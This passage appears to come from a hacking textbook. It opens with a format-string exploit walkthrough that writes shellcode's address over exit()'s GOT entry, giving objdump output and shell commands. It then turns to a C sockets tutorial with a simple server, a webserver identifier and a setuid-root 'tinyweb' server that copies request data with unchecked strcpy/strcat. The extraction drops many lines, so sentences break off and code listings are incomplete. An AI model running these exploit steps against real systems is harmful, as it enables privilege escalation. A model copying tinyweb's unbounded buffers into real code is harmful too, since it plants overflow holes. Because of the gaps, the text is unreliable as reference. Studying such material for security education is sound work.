\"\\ .plt\\ \"\n10 .plt          00000060  080482b8  080482b8  000002b8  2**2\nBut closer examination of the jump instructions (shown in bold below)\nreveals that they aren\u2019t jumping to addresses but to pointers to addresses. For\nexample, the actual address of the printf() function is stored as a pointer at\nthe memory address 0x08049780, and the exit() function\u2019s address is stored at\n80482f8:       ff 25 80 97 04 08       jmp    *0x8049780\n80482fe:       68 18 00 00 00          push   $0x18\n8048303:       e9 b0 ff ff ff          jmp    80482b8 <_init+0x18>\n8048308:       ff 25 84 97 04 08       jmp    *0x8049784\n804830e:       68 20 00 00 00          push   $0x20\n8048313:       e9 a0 ff ff ff          jmp    80482b8 <_init+0x18>\nThese addresses exist in another section, called the global offset table (GOT),\nwhich is writable. These addresses can be directly obtained by displaying the\ndynamic relocation entries for the binary by using objdump.\nThis reveals that the address of the exit() function (shown in bold above)\nis located in the GOT at 0x08049784. If the address of the shellcode is over-\nwritten at this location, the program should call the shellcode when it thinks\nAs usual, the shellcode is put in an environment variable, its actual\nlocation is predicted, and the format string vulnerability is used to write the\nvalue. Actually, the shellcode should still be located in the environment from\nbefore, meaning that the only things that need adjustment are the first 16 bytes\nof the format string. The calculations for the %x format parameters will be done\nonce again for clarity. In the output below, the address of the shellcode (\u0000)\nis written into the address of the exit() function (\u0000).\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./fmt_vuln\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x86\\x97\\x04\\x08\\x84\\x97\\x04\\\nWhen fmt_vuln.c tries to call the exit() function, the address of the\nexit() function is looked up in the GOT and is jumped to via the PLT. Since\nthe actual address has been switched with the address for the shellcode in the\nAnother advantage of overwriting the GOT is that the GOT entries are\nfixed per binary, so a different system with the same binary will have the same\nThe ability to overwrite any arbitrary address opens up many possibilities\nfor exploitation. Basically, any section of memory that is writable and contains\nan address that directs the flow of program execution can be targeted.\ncoordinate actions, and share experiences. Similarly,\nprograms can become much more powerful when they have the ability to\ncommunicate with other programs via a network. The real utility of a web\nbrowser isn\u2019t in the program itself, but in its ability to communicate with\nNetworking is so prevalent that it is sometimes taken for granted. Many\napplications such as email, the Web, and instant messaging rely on network-\ning. Each of these applications relies on a particular network protocol, but\neach protocol uses the same general network transport methods.\nMany people don\u2019t realize that there are vulnerabilities in the networking\nprotocols themselves. In this chapter you will learn how to network your appli-\ncations using sockets and how to deal with common network vulnerabilities.\nWhen two computers talk to each other, they need to speak the same lan-\nguage. The structure of this language is described in layers by the OSI model.\nThe OSI model provides standards that allow hardware, such as routers and\nfirewalls, to focus on one particular aspect of communication that applies to\nthem and ignore others. The OSI model is broken down into conceptual\nlayers of communication. This way, routing and firewall hardware can focus\non passing data at the lower layers, ignoring the higher layers of data encap-\nsulation used by running applications. The seven OSI layers are as follows:\nThis layer deals with the physical connection between\ntwo points. This is the lowest layer, whose primary role is communicating\nraw bit streams. This layer is also responsible for activating, maintaining,\nThis layer deals with actually transferring data between\ntwo points. In contrast with the physical layer, which takes care of send-\ning the raw bits, this layer provides high-level functions, such as error\ncorrection and flow control. This layer also provides procedures for acti-\nvating, maintaining, and deactivating data-link connections.\nThis layer works as a middle ground; its primary role is\nto pass information between the lower and the higher layers. It provides\nThis layer provides transparent transfer of data between\nsystems. By providing reliable data communication, this layer allows the\nhigher layers to never worry about reliability or cost-effectiveness of data\nThis layer is responsible for establishing and maintaining\nThis layer is responsible for presenting the data to\napplications in a syntax or language they understand. This allows for\nWhen data is communicated through these protocol layers, it\u2019s sent in\nsmall pieces called packets. Each packet contains implementations of these\nprotocol layers. Starting from the application layer, the packet wraps the pre-\nsentation layer around that data, which wraps the session layer, which wraps\nthe transport layer, and so forth. This process is called encapsulation. Each\nwrapped layer contains a header and a body. The header contains the pro-\ntocol information needed for that layer, while the body contains the data for\nthat layer. The body of one layer contains the entire package of previously\nencapsulated layers, like the skin of an onion or the functional contexts\nFor example, whenever you browse the Web, the Ethernet cable and\ncard make up the physical layer, taking care of the transmission of raw bits\nfrom one end of the cable to the other. The next later is the data link layer.\nIn the web browser example, Ethernet makes up this layer, which provides\nthe low-level communications between Ethernet ports on the LAN. This\nprotocol allows for communication between Ethernet ports, but these ports\ndon\u2019t yet have IP addresses. The concept of IP addresses doesn\u2019t exist until\nthe next layer, the network layer. In addition to addressing, this layer is\nresponsible for moving data from one address to another. These three\nlower layers together are able to send packets of data from one IP address\nto another. The next layer is the transport layer, which for web traffic is\nTCP; it provides a seamless bidirectional socket connection. The term TCP/IP\ndescribes the use of TCP on the transport layer and IP on the network layer.\nOther addressing schemes exist at this layer; however, your web traffic\nprobably uses IP version 4 (IPv4). IPv4 addresses follow a familiar form\nof XX.XX.XX.XX. IP version 6 (IPv6) also exists on this layer, with a totally\ndifferent addressing scheme. Since IPv4 is most common, IP will always\nThe web traffic itself uses HTTP (Hypertext Transfer Protocol) to com-\nmunicate, which is in the top layer of the OSI model. When you browse the\nWeb, the web browser on your network is communicating across the Internet\nwith the webserver located on a different private network. When this happens,\nthe data packets are encapsulated down to the physical layer where they are\npassed to a router. Since the router isn\u2019t concerned with what\u2019s actually in\nthe packets, it only needs to implement protocols up to the network layer.\nThe router sends the packets out to the Internet, where they reach the other\nnetwork\u2019s router. This router then encapsulates this packet with the lower-\nlayer protocol headers needed for the packet to reach its final destination.\nThis process is shown in the following illustration.\nAll of this packet encapsulation makes up a complex language that hosts\non the Internet (and other types of networks) use to communicate with each\nother. These protocols are programmed into routers, firewalls, and your\ncomputer\u2019s operating system so they can communicate. Programs that use\nnetworking, such as web browsers and email clients, need to interface with\nthe operating system which handles the network communications. Since the\noperating system takes care of the details of network encapsulation, writing\nnetwork programs is just a matter of using the network interface of the OS.\nA socket is a standard way to perform network communication through the\nOS. A socket can be thought of as an endpoint to a connection, like a socket\non an operator\u2019s switchboard. But these sockets are just a programmer\u2019s\nabstraction that takes care of all the nitty-gritty details of the OSI model\ndescribed above. To the programmer, a socket can be used to send or receive\ndata over a network. This data is transmitted at the session layer (5), above\nthe lower layers (handled by the operating system), which take care of\nrouting. There are several different types of sockets that determine the\nstructure of the transport layer (4). The most common types are stream\nStream sockets provide reliable two-way communication similar to when\nyou call someone on the phone. One side initiates the connection to the\nother, and after the connection is established, either side can communicate\nto the other. In addition, there is immediate confirmation that what you said\nactually reached its destination. Stream sockets use a standard communica-\ntion protocol called Transmission Control Protocol (TCP), which exists on\nthe transport layer (4) of the OSI model. On computer networks, data is\nusually transmitted in chunks called packets. TCP is designed so that the\npackets of data will arrive without errors and in sequence, like words\narriving at the other end in the order they were spoken when you are\ntalking on the telephone. Webservers, mail servers, and their respective\nclient applications all use TCP and stream sockets to communicate.\nAnother common type of socket is a datagram socket. Communicating\nwith a datagram socket is more like mailing a letter than making a phone call.\nThe connection is one-way only and unreliable. If you mail several letters, you\ncan\u2019t be sure that they arrived in the same order, or even that they reached\ntheir destination at all. The postal service is pretty reliable; the Internet, how-\never, is not. Datagram sockets use another standard protocol called UDP\ninstead of TCP on the transport layer (4). UDP stands for User Datagram\nProtocol, implying that it can be used to create custom protocols. This\nprotocol is very basic and lightweight, with few safeguards built into it. It\u2019s\nnot a real connection, just a basic method for sending data from one point\nto another. With datagram sockets, there is very little overhead in the protocol,\nbut the protocol doesn\u2019t do much. If your program needs to confirm that a\npacket was received by the other side, the other side must be coded to send\nback an acknowledgment packet. In some cases packet loss is acceptable.\nDatagram sockets and UDP are commonly used in networked games and\nstreaming media, since developers can tailor their communications exactly\nIn C, sockets behave a lot like files since they use file descriptors to identify\nthemselves. Sockets behave so much like files that you can actually use the\nread() and write() functions to receive and send data using socket file descrip-\ntors. However, there are several functions specifically designed for dealing\nwith sockets. These functions have their prototypes defined in /usr/include/\nUsed to create a new socket, returns a file descriptor for the socket or\nconnect(int fd, struct sockaddr *remote_host, socklen_t addr_length)\nConnects a socket (described by file descriptor fd) to a remote host.\nbind(int fd, struct sockaddr *local_addr, socklen_t addr_length)\nBinds a socket to a local address so it can listen for incoming connections.\nListens for incoming connections and queues connection requests up to\nbacklog_queue_size. Returns 0 on success and -1 on error.\naccept(int fd, sockaddr *remote_host, socklen_t *addr_length)\nAccepts an incoming connection on a bound socket. The address infor-\nmation from the remote host is written into the remote_host structure and\nthe actual size of the address structure is written into *addr_length. This\nfunction returns a new socket file descriptor to identify the connected\nSends n bytes from *buffer to socket fd; returns the number of bytes sent\nReceives n bytes from socket fd into *buffer; returns the number of bytes\nWhen a socket is created with the socket() function, the domain, type,\nand protocol of the socket must be specified. The domain refers to the pro-\ntocol family of the socket. A socket can be used to communicate using a\nvariety of protocols, from the standard Internet protocol used when you\nbrowse the Web to amateur radio protocols such as AX.25 (when you are\nbeing a gigantic nerd). These protocol families are defined in bits/socket.h,\n#define PF_LOCAL  1 /* Local to host (pipes and file-domain).  */\n#define PF_UNIX   PF_LOCAL /* Old BSD name for PF_LOCAL.  */\n#define PF_FILE   PF_LOCAL /* Another nonstandard name for PF_LOCAL.  */\n#define PF_IPX    4 /* Novell Internet Protocol.  */\n#define PF_X25    9 /* Reserved for X.25 project.  */\nAs mentioned before, there are several types of sockets, although stream\nsockets and datagram sockets are the most commonly used. The types of sockets\nare also defined in bits/socket.h. (The /* comments */ in the code above are\njust another style that comments out everything between the asterisks.)\nSOCK_STREAM = 1,    /* Sequenced, reliable, connection-based byte streams.  */\nSOCK_DGRAM = 2,   /* Connectionless, unreliable datagrams of fixed maximum length.  */\nThe final argument for the socket() function is the protocol, which should\nalmost always be 0. The specification allows for multiple protocols within a\nprotocol family, so this argument is used to select one of the protocols from\nthe family. In practice, however, most protocol families only have one pro-\ntocol, which means this should usually be set for 0; the first and only protocol\nin the enumeration of the family. This is the case for everything we will do\nwith sockets in this book, so this argument will always be 0 in our examples.\nMany of the socket functions reference a sockaddr structure to pass address\ninformation that defines a host. This structure is also defined in bits/socket.h,\n/* Get the definition of the macro to define the common sockaddr members.  */\n__SOCKADDR_COMMON (sa_);  /* Common data: address family and length.\nThe macro for SOCKADDR_COMMON is defined in the included bits/sockaddr.h\nfile, which basically translates to an unsigned short int. This value defines\nthe address family of the address, and the rest of the structure is saved for\naddress data. Since sockets can communicate using a variety of protocol\nfamilies, each with their own way of defining endpoint addresses, the defini-\ntion of an address must also be variable, depending on the address family.\nThe possible address families are also defined in bits/socket.h; they usually\ntranslate directly to the corresponding protocol families.\nSince an address can contain different types of information, depending\non the address family, there are several other address structures that contain,\nin the address data section, common elements from the sockaddr structure as\nwell as information specific to the address family. These structures are also\nthe same size, so they can be typecast to and from each other. This means\nthat a socket() function will simply accept a pointer to a sockaddr structure,\nwhich can in fact point to an address structure for IPv4, IPv6, or X.25. This\nallows the socket functions to operate on a variety of protocols.\nIn this book we are going to deal with Internet Protocol version 4, which\nis the protocol family PF_INET, using the address family AF_INET. The parallel\nsocket address structure for AF_INET is defined in the netinet/in.h file.\n/* Structure describing an Internet socket address.  */\nstruct in_addr sin_addr;    /* Internet address.  */\nThe SOCKADDR_COMMON part at the top of the structure is simply the unsigned\nshort int mentioned above, which is used to define the address family. Since\na socket endpoint address consists of an Internet address and a port number,\nthese are the next two values in the structure. The port number is a 16-bit\nshort, while the in_addr structure used for the Internet address contains a\n32-bit number. The rest of the structure is just 8 bytes of padding to fill out\nthe rest of the sockaddr structure. This space isn\u2019t used for anything, but must\nbe saved so the structures can be interchangeably typecast. In the end, the\nsocket address structures end up looking like this:\nThe port number and IP address used in the AF_INET socket address structure\nare expected to follow the network byte ordering, which is big-endian. This is\nthe opposite of x86\u2019s little-endian byte ordering, so these values must be con-\nverted. There are several functions specifically for these conversions, whose\nprototypes are defined in the netinet/in.h and arpa/inet.h include files. Here\nis a summary of these common byte order conversion functions:\nConverts a 32-bit integer from the host\u2019s byte order to network byte order\nConverts a 16-bit integer from the host\u2019s byte order to network byte order\nConverts a 32-bit integer from network byte order to the host\u2019s byte order\nConverts a 16-bit integer from network byte order to the host\u2019s byte order\nFor compatibility with all architectures, these conversion functions should\nstill be used even if the host is using a processor with big-endian byte ordering.\nWhen you see 12.110.110.204, you probably recognize this as an Internet\naddress (IP version 4). This familiar dotted-number notation is a common\nway to specify Internet addresses, and there are functions to convert this\nnotation to and from a 32-bit integer in network byte order. These functions\nare defined in the arpa/inet.h include file, and the two most useful con-\ninet_aton(char *ascii_addr, struct in_addr *network_addr)\nThis function converts an ASCII string containing an IP address in dotted-\nnumber format into an in_addr structure, which, as you remember, only\ncontains a 32-bit integer representing the IP address in network byte\nThis function converts the other way. It is passed a pointer to an in_addr\nstructure containing an IP address, and the function returns a character\npointer to an ASCII string containing the IP address in dotted-number\nformat. This string is held in a statically allocated memory buffer in the\nfunction, so it can be accessed until the next call to inet_ntoa(), when the\nThe best way to show how these functions are used is by example. The following\nserver code listens for TCP connections on port 7890. When a client connects,\nit sends the message Hello, world! and then receives data until the connection\nis closed. This is done using socket functions and structures from the include\nfiles mentioned earlier, so these files are included at the beginning of the\nprogram. A useful memory dump function has been added to hacking.h,\n// Dumps raw memory in hex byte and printable split format\nvoid dump(const unsigned char *data_buffer, const unsigned int length) {\nprintf(\"%02x \", data_buffer[i]);  // Display byte in hex.\nfor(j=(i-(i%16)); j <= i; j++) {  // Display printable bytes from line.\nif((byte > 31) && (byte < 127)) // Outside printable char range\nprintf(\"\\n\"); // End of the dump line (each line is 16 bytes)\nThis function is used to display packet data by the server program.\nHowever, since it is also useful in other places, it has been put into hacking.h,\ninstead. The rest of the server program will be explained as you read the\n#define PORT 7890 // The port users will be connecting to\nint sockfd, new_sockfd;  // Listen on sock_fd, new connection on new_fd\nstruct sockaddr_in host_addr, client_addr;   // My address information\nif ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\nif (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\nSo far, the program sets up a socket using the socket() function. We want\na TCP/IP socket, so the protocol family is PF_INET for IPv4 and the socket type\nis SOCK_STREAM for a stream socket. The final protocol argument is 0, since there\nis only one protocol in the PF_INET protocol family. This function returns a\nThe setsockopt() function is simply used to set socket options. This func-\ntion call sets the SO_REUSEADDR socket option to true, which will allow it to reuse\na given address for binding. Without this option set, when the program tries\nto bind to a given port, it will fail if that port is already in use. If a socket isn\u2019t\nclosed properly, it may appear to be in use, so this option lets a socket bind to\na port (and take over control of it), even if it seems to be in use.\nThe first argument to this function is the socket (referenced by a file\ndescriptor), the second specifies the level of the option, and the third specifies\nthe option itself. Since SO_REUSEADDR is a socket-level option, the level is set to\nSOL_SOCKET. There are many different socket options defined in /usr/include/\nasm/socket.h. The final two arguments are a pointer to the data that the\noption should be set to and the length of that data. A pointer to data and the\nlength of that data are two arguments that are often used with socket func-\ntions. This allows the functions to handle all sorts of data, from single bytes\nto large data structures. The SO_REUSEADDR options uses a 32-bit integer for its\nvalue, so to set this option to true, the final two arguments must be a pointer\nto the integer value of 1 and the size of an integer (which is 4 bytes).\nhost_addr.sin_family = AF_INET;    // Host byte order\nhost_addr.sin_port = htons(PORT);  // Short, network byte order\nhost_addr.sin_addr.s_addr = 0; // Automatically fill with my IP.\nmemset(&(host_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\nif (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\nThese next few lines set up the host_addr structure for use in the bind call.\nThe address family is AF_INET, since we are using IPv4 and the sockaddr_in\nstructure. The port is set to PORT, which is defined as 7890. This short integer\nvalue must be converted into network byte order, so the htons() function is\nused. The address is set to 0, which means it will automatically be filled with\nthe host\u2019s current IP address. Since the value 0 is the same regardless of byte\nThe bind() call passes the socket file descriptor, the address structure,\nand the length of the address structure. This call will bind the socket to the\nThe listen() call tells the socket to listen for incoming connections, and\na subsequent accept() call actually accepts an incoming connection. The\nlisten() function places all incoming connections into a backlog queue until an\naccept() call accepts the connections. The last argument to the listen() call\nnew_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\ninet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));\nNext is a loop that accepts incoming connections. The accept() function\u2019s\nfirst two arguments should make sense immediately; the final argument is a\npointer to the size of the address structure. This is because the accept() func-\ntion will write the connecting client\u2019s address information into the address\nstructure and the size of that structure into sin_size. For our purposes, the\nsize never changes, but to use the function we must obey the calling conven-\ntion. The accept() function returns a new socket file descriptor for the accepted\nconnection. This way, the original socket file descriptor can continue to\nbe used for accepting new connections, while the new socket file descriptor\nis used for communicating with the connected client.\nAfter getting a connection, the program prints out a connection message,\nusing inet_ntoa() to convert the sin_addr address structure to a dotted-number\nIP string and ntohs() to convert the byte order of the sin_port number.\nThe send() function sends the 13 bytes of the string Hello, world!\\n to the\nnew socket that describes the new connection. The final argument for the\nsend() and recv() functions are flags, that for our purposes, will always be 0.\nNext is a loop that receives data from the connection and prints it out.\nThe recv() function is given a pointer to a buffer and a maximum length to\nread from the socket. The function writes the data into the buffer passed to it\nand returns the number of bytes it actually wrote. The loop will continue as\nWhen compiled and run, the program binds to port 7890 of the host and\nA telnet client basically works like a generic TCP connection client, so it\ncan be used to connect to the simple server by specifying the target IP address\nUpon connection, the server sends the string Hello, world!, and the rest\nis the local character echo of me typing this is a test and a line of keyboard\nmashing. Since telnet is line-buffered, each of these two lines is sent back to the\nserver when ENTER is pressed. Back on the server side, the output shows the\nconnection and the packets of data that are sent back.\nserver: got connection from 192.168.42.1 port 56971\n74 68 69 73 20 69 73 20 61 20 74 65 73 74 0d 0a | This is a test...\n66 6a 73 67 68 61 75 3b 65 68 67 3b 69 68 73 6b | fjsghau;ehg;ihsk\n6a 66 68 61 73 64 6b 66 6a 68 61 73 6b 6a 76 68 | jfhasdkfjhaskjvh\n66 64 6b 6a 68 76 62 6b 6a 67 66 0d 0a          | fdkjhvbkjgf...\nThe telnet program works well as a client for our server, so there really isn\u2019t\nmuch reason to write a specialized client. However, there are thousands of\ndifferent types of servers that accept standard TCP/IP connections. Every\ntime you use a web browser, it makes a connection to a webserver somewhere.\nThis connection transmits the web page over the connection using HTTP,\nwhich defines a certain way to request and send information. By default,\nwebservers run on port 80, which is listed along with many other default\nHTTP exists in the application layer\u2014the top layer\u2014of the OSI model.\nAt this layer, all of the networking details have already been taken care of by\nthe lower layers, so HTTP uses plaintext for its structure. Many other\napplication layer protocols also use plaintext, such as POP3, SMTP, IMAP,\nand FTP\u2019s control channel. Since these are standard protocols, they are all\nwell documented and easily researched. Once you know the syntax of these\nvarious protocols, you can manually talk to other programs that speak the\nsame language. There\u2019s no need to be fluent, but knowing a few important\nphrases will help you when traveling to foreign servers. In the language of\nHTTP, requests are made using the command GET, followed by the resource\npath and the HTTP protocol version. For example, GET / HTTP/1.0 will request\nthe root document from the webserver using HTTP version 1.0. The request\nis actually for the root directory of /, but most webservers will automatically\nsearch for a default HTML document in that directory of index.html.  If the\nserver finds the resource, it will respond using HTTP by sending several\nheaders before sending the content. If the command HEAD is used instead of\nGET, it will only return the HTTP headers without the content. These headers\nare plaintext and can usually provide information about the server. These\nheaders can be retrieved manually using telnet by connecting to port 80 of a\nknown website, then typing HEAD / HTTP/1.0 and pressing ENTER twice. In the\noutput below, telnet is used to open a TCP-IP connection to the webserver at\nhttp://www.internic.net. Then the HTTP application layer is manually\nspoken to request the headers for the main index page.\nreader@hacking:~/booksrc $ telnet www.internic.net 80\nThis reveals that the webserver is Apache version 2.0.52 and even that\nthe host runs CentOS. This can be useful for profiling, so let\u2019s write a pro-\nThe next few programs will be sending and receiving a lot of data. Since\nthe standard socket functions aren\u2019t very friendly, let\u2019s write some functions\nto send and receive data. These functions, called send_string() and recv_line(),\nwill be added to a new include file called hacking-network.h.\nThe normal send() function returns the number of bytes written, which\nisn\u2019t always equal to the number of bytes you tried to send. The send_string()\nfunction accepts a socket and a string pointer as arguments and makes sure\nthe entire string is sent out over the socket. It uses strlen() to figure out the\nYou may have noticed that every packet the simple server received ended\nwith the bytes 0x0D and 0x0A. This is how telnet terminates the lines\u2014it sends\na carriage return and a newline character. The HTTP protocol also expects\nlines to be terminated with these two bytes. A quick look at an ASCII table\nshows that 0x0D is a carriage return ('\\r') and 0x0A is the newline character\nreader@hacking:~/booksrc $ man ascii | egrep \"Hex|0A|0D\"\nOct   Dec   Hex   Char                        Oct   Dec   Hex   Char\n012   10    0A    LF  '\\n' (new line)         112   74    4A    J\n015   13    0D    CR  '\\r' (carriage ret)     115   77    4D    M\nThe recv_line() function reads entire lines of data. It reads from the socket\npassed as the first argument into the a buffer that the second argument points\nto. It continues receiving from the socket until it encounters the last two line-\ntermination bytes in sequence. Then it terminates the string and exits the\nfunction. These new functions ensure that all bytes are sent and receive data\nas lines terminated by '\\r\\n'. They are listed below in a new include file called\n/* This function accepts a socket FD and a ptr to the null terminated\n* string to send.  The function will make sure all the bytes of the\n* string are sent.  Returns 1 on success and 0 on failure.\nint send_string(int sockfd, unsigned char *buffer) {\nsent_bytes = send(sockfd, buffer, bytes_to_send, 0);\n/* This function accepts a socket FD and a ptr to a destination\n* buffer.  It will receive from the socket until the EOL byte\n* sequence in seen.  The EOL bytes are read from the socket, but\n* the destination buffer is terminated before these bytes.\n* Returns the size of the read line (without EOL bytes).\nint recv_line(int sockfd, unsigned char *dest_buffer) {\nwhile(recv(sockfd, ptr, 1, 0) == 1) { // Read a single byte.\nif(*ptr == EOL[eol_matched]) { // Does this byte match terminator?\nif(eol_matched == EOL_SIZE) { // If all bytes match terminator,\nreturn strlen(dest_buffer); // Return bytes received\nreturn 0; // Didn't find the end-of-line characters.\nMaking a socket connection to a numerical IP address is pretty simple\nbut named addresses are commonly used for convenience. In the manual HTTP\nHEAD request, the telnet program automatically does a DNS (Domain Name\nService) lookup to determine that www.internic.net translates to the IP address\n192.0.34.161. DNS is a protocol that allows an IP address to be looked up by a\nnamed address, similar to how a phone number can be looked up in a phone\nbook if you know the name. Naturally, there are socket-related functions and\nstructures specifically for hostname lookups via DNS. These functions and struc-\ntures are defined in netdb.h. A function called gethostbyname() takes a pointer\nto a string containing a named address and returns a pointer to a hostent\nstructure, or NULL pointer on error. The hostent structure is filled with infor-\nmation from the lookup, including the numerical IP address as a 32-bit integer\nin network byte order. Similar to the inet_ntoa() function, the memory for\nthis structure is statically allocated in the function. This structure is shown\n/* Description of database entry for a single host.  */\nchar **h_addr_list;   /* List of addresses from name server.  */\n#define h_addr  h_addr_list[0]  /* Address, for backward compatibility.  */\nThe following code demonstrates the use of the gethostbyname() function.\nprintf(\"%s has address %s\\n\", argv[1], inet_ntoa(*address));\nThis program accepts a hostname as its only argument and prints out the\nIP address. The gethostbyname() function returns a pointer to a hostent struc-\nture, which contains the IP address in element h_addr. A pointer to this element\nis typecast into an in_addr pointer, which is later dereferenced for the call to\ninet_ntoa(), which expects a in_addr structure as its argument. Sample program\nreader@hacking:~/booksrc $ gcc -o host_lookup host_lookup.c\nreader@hacking:~/booksrc $ ./host_lookup www.internic.net\nreader@hacking:~/booksrc $ ./host_lookup www.google.com\nUsing socket functions to build on this, creating a webserver identification\nif ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\ntarget_addr.sin_addr = *((struct in_addr *)host_info->h_addr);\nmemset(&(target_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\nif (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)\nprintf(\"The web server for %s is %s\\n\", argv[1], buffer+8);\nMost of this code should make sense to you now. The target_addr struc-\nture\u2019s sin_addr element is filled using the address from the host_info structure\nby typecasting and then dereferencing as before (but this time it\u2019s done in a\nsingle line). The connect() function is called to connect to port 80 of the target\nhost, the command string is sent, and the program loops reading each line\ninto buffer. The strncasecmp() function is a string comparison function from\nstrings.h. This function compares the first n bytes of two strings, ignoring\ncapitalization. The first two arguments are pointers to the strings, and the third\nargument is n, the number of bytes to compare. The function will return 0 if\nthe strings match, so the if statement is searching for the line that starts with\n\"Server:\". When it finds it, it removes the first eight bytes and prints the web-\nserver version information. The following listing shows compilation and\nreader@hacking:~/booksrc $ gcc -o webserver_id webserver_id.c\nreader@hacking:~/booksrc $ ./webserver_id www.internic.net\nThe web server for www.internic.net is Apache/2.0.52 (CentOS)\nreader@hacking:~/booksrc $ ./webserver_id www.microsoft.com\nThe web server for www.microsoft.com is Microsoft-IIS/7.0\nA webserver doesn\u2019t have to be much more complex than the simple server\nwe created in the previous section. After accepting a TCP-IP connection, the\nwebserver needs to implement further layers of communication using the\nThe server code listed below is nearly identical to the simple server, except\nthat connection handling code is separated into its own function. This func-\ntion handles HTTP GET and HEAD requests that would come from a web browser.\nThe program will look for the requested resource in the local directory called\nwebroot and send it to the browser. If the file can\u2019t be found, the server will\nrespond with a 404 HTTP response. You may already be familiar with this\nresponse, which means File Not Found. The complete source code listing\n#define PORT 80   // The port users will be connecting to\n#define WEBROOT \"./webroot\" // The webserver's root directory\nvoid handle_connection(int, struct sockaddr_in *); // Handle web requests\nint get_file_size(int); // Returns the filesize of open file descriptor\nstruct sockaddr_in host_addr, client_addr;   // My address information\nprintf(\"Accepting web requests on port %d\\n\", PORT);\nif ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)\nif (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)\nhost_addr.sin_family = AF_INET;      // Host byte order\nhost_addr.sin_port = htons(PORT);    // Short, network byte order\nhost_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.\nmemset(&(host_addr.sin_zero), '\\0', 8); // Zero the rest of the struct.\nif (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)\nnew_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);\n/* This function handles the connection on the passed socket from the\n* passed client address.  The connection is processed as a web request,\n* and this function replies over the connected socket.  Finally, the\n* passed socket is closed at the end of the function.\nvoid handle_connection(int sockfd, struct sockaddr_in *client_addr_ptr) {\nprintf(\"Got request from %s:%d \\\"%s\\\"\\n\", inet_ntoa(client_addr_ptr->sin_addr),\nptr = strstr(request, \" HTTP/\"); // Search for valid-looking request.\n*ptr = 0; // Terminate the buffer at the end of the URL.\nptr = NULL; // Set ptr to NULL (used to flag for an invalid request).\nif(strncmp(request, \"GET \", 4) == 0)  // GET request\nif(strncmp(request, \"HEAD \", 5) == 0) // HEAD request\nif(ptr == NULL) { // Then this is not a recognized request.\n} else { // Valid request, with ptr pointing to the resource name\nif (ptr[strlen(ptr) - 1] == '/')  // For resources ending with '/',\nstrcat(ptr, \"index.html\");     // add 'index.html' to the end.\nstrcpy(resource, WEBROOT);     // Begin resource with web root path\nstrcat(resource, ptr);         //  and join it with resource path.\nfd = open(resource, O_RDONLY, 0); // Try to open the file.\nsend_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\nsend_string(sockfd, \"<html><head><title>404 Not Found</title></head>\");\nsend_string(sockfd, \"<body><h1>URL not found</h1></body></html>\\r\\n\");\nsend_string(sockfd, \"Server: Tiny webserver\\r\\n\\r\\n\");\nif(ptr == request + 4) { // Then this is a GET request\nif( (ptr = (unsigned char *) malloc(length)) == NULL)\nread(fd, ptr, length); // Read the file into memory.\nsend(sockfd, ptr, length, 0);  // Send it to socket.\nshutdown(sockfd, SHUT_RDWR); // Close the socket gracefully.\n/* This function accepts an open file descriptor and returns\n* the size of the associated file.  Returns -1 on failure.\nThe handle_connection function uses the strstr() function to look for the\nsubstring HTTP/ in the request buffer. The strstr() function returns a pointer\nto the substring, which will be right at the end of the request. The string is\nterminated here, and the requests HEAD and GET are recognized as processable\nrequests. A HEAD request will just return the headers, while a GET request will\nalso return the requested resource (if it can be found).\nThe files index.html and image.jpg have been put into the directory\nwebroot, as  shown in the output below, and then the tinyweb program is\ncompiled. Root privileges are needed to bind to any port below 1024, so the\nprogram is setuid root and executed. The server\u2019s debugging output shows\nthe results of a web browser\u2019s request of http://127.0.0.1:\n-rwxr--r-- 1 reader reader 46794 2007-05-28 23:43 image.jpg\n-rw-r--r-- 1 reader reader   261 2007-05-28 23:42 index.html\nreader@hacking:~/booksrc $ gcc -o tinyweb tinyweb.c\nreader@hacking:~/booksrc $ sudo chown root ./tinyweb\nreader@hacking:~/booksrc $ sudo chmod u+s ./tinyweb\nGot request from 127.0.0.1:52997 \"GET /image.jpg HTTP/1.1\"\nGot request from 127.0.0.1:52998 \"GET /favicon.ico HTTP/1.1\"\nThe address 127.0.0.1 is a special loopback address that routes to the\nlocal machine. The initial request gets index.html from the webserver, which\nin turn requests image.jpg. In addition, the browser automatically requests\nfavicon.ico in an attempt to retrieve an icon for the web page. The screen-\nshot below shows the results of this request in a browser.\nWhen you use a web browser, all seven OSI layers are taken care of for you,\nallowing you to focus on browsing and not protocols. At the upper layers of\nOSI, many protocols can be plaintext since all the other details of the connec-\ntion are already taken care of by the lower layers. Sockets exist on the session\nlayer (5), providing an interface to send data from one host to another.\nTCP on the transport layer (4) provides reliability and transport control,\nwhile IP on the network layer (3) provides addressing and packet-level\ncommunication. Ethernet on the data-link layer (2) provides addressing\nbetween Ethernet ports, suitable for basic LAN (Local Area Network)\ncommunications. At the bottom, the physical layer (1) is simply the wire and\nthe protocol used to send bits from one device to another. A single HTTP\nmessage will be wrapped in multiple layers as it is passed through different\nThis process can be thought of as an intricate interoffice bureaucracy,\nreminiscent of the movie Brazil. At each layer, there is a highly specialized\nreceptionist who only understands the language and protocol of that layer.\nAs data packets are transmitted, each receptionist performs the necessary\nduties of her particular layer, puts the packet in an interoffice envelope,\nwrites the header on the outside, and passes it on to the receptionist at the\nnext layer below. That receptionist, in turn, performs the necessary duties\nof his layer, puts the entire envelope in another envelope, writes the header\non the outside, and passes it on. Network traffic is a chattering bureaucracy\nof servers, clients, and peer-to-peer connections. At the higher 